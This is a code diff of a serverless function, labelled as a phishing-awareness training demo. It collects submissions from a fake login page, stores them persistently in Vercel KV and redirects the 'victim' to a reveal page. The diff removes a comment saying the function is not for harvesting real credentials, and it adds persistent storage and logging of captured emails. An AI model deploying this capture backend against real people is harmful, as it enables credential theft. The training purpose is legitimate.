@@ -1,17 +1,12 @@
 // ============================================================
 // SECURITY AWARENESS TRAINING DEMO
-// This serverless function captures form submissions from the
-// fake login page and stores them in memory so the trainer can
-// show the audience what a phishing kit collects. It is NOT
-// designed to harvest real credentials and should only ever
-// receive demo input from the trainer.
+// Captures form submissions and stores them in Vercel KV so
+// the trainer dashboard can display them during the live demo.
 // ============================================================
 
-// Simple in-memory store. Resets when the Vercel function cold-starts.
-// For a demo this is fine — you want it to be ephemeral.
-global.captured = global.captured || [];
+import { kv } from '@vercel/kv';
 
-export default function handler(req, res) {
+export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -26,13 +21,15 @@ export default function handler(req, res) {
     userAgent: req.headers['user-agent'] || 'unknown'
   };
 
-  global.captured.push(entry);
-  // Keep only the last 50 entries so memory doesn't grow forever
-  if (global.captured.length > 50) {
-    global.captured = global.captured.slice(-50);
+  try {
+    // Push the entry to the front of a list called "captures"
+    await kv.lpush('captures', JSON.stringify(entry));
+    // Keep only the latest 50 entries
+    await kv.ltrim('captures', 0, 49);
+    console.log('[TRAINING DEMO] Capture stored:', entry.email);
+  } catch (err) {
+    console.error('[TRAINING DEMO] KV error:', err);
   }
-
-  console.log('[TRAINING DEMO] Credential capture:', entry);
 
   // Redirect victim to the "you were phished" reveal page
   res.writeHead(302, { Location: '/caught.html' });
